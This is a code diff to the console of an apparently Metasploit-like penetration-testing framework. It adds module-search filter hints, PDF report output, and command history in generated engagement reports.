-            entries = _module_registry.search(query) if query else _module_registry.all()
+            entries = _module_registry.search(query)
             if query:
                 print(info(f"  Search: {_c(query, _WHITE)}  — {len(entries)} match(es)"))
+                print(info(
+                    f"  Filters: type: platform: cve: rank:>N author: name:  "
+                    f"(combine freely with plain keywords)"
+                ))
             if not entries:
-                print(warn("  No modules loaded."))
+                print(warn("  No modules found."))
                 return
             print()
             print(_c(f"  {'Name':<44}  {'Type':<12}  {'Rank':<6}  Description", _BOLD, _WHITE))
@@ -2603,7 +3323,8 @@ class Console:
                 )
             print()
         else:
-            print(err("Usage: show modules [query]"))
+            print(err("Usage: show modules [<query>]"))
+            print(info("  Filters: type: platform: cve: rank:>N author: name:"))
 
     # ---------------------------------------------------------------
     # Jobs command (stub until Sprint 5a jobs engine is wired)
@@ -2698,16 +3419,21 @@ class Console:
     # ---------------------------------------------------------------
 
     def _cmd_report(self, args: list[str]) -> None:
-        """report [html|json] [output_path]"""
+        """report [html|json|pdf] [output_path]"""
         try:
             from megaploit.reporting.report import generate_report
         except ImportError:
             print(warn("  Report engine not available."))
             return
         fmt = args[0].lower() if args else "html"
-        out = args[1] if len(args) > 1 else f"report_{int(time.time())}.{fmt}"
+        if fmt not in ("html", "json", "pdf"):
+            fmt = "html"
+        ext = fmt if fmt != "pdf" else "pdf"
+        out = args[1] if len(args) > 1 else f"report_{int(time.time())}.{ext}"
         with self._sessions_lock:
             sessions = list(self._sessions.values())
+        # Pass the full command history so it appears in the report timeline
+        history = _cmd_history.tail(n=500)
         try:
             generate_report(
                 output_path=out,
@@ -2716,6 +3442,7 @@ class Console:
                 engagement_desc=self.engagement_desc,
                 engagement_start=self.engagement_start,
                 sessions=sessions,
+                command_history=history,
             )
             print(ok(f"  Report written to {_c(out, _CYAN)}"))
         except Exception as exc:
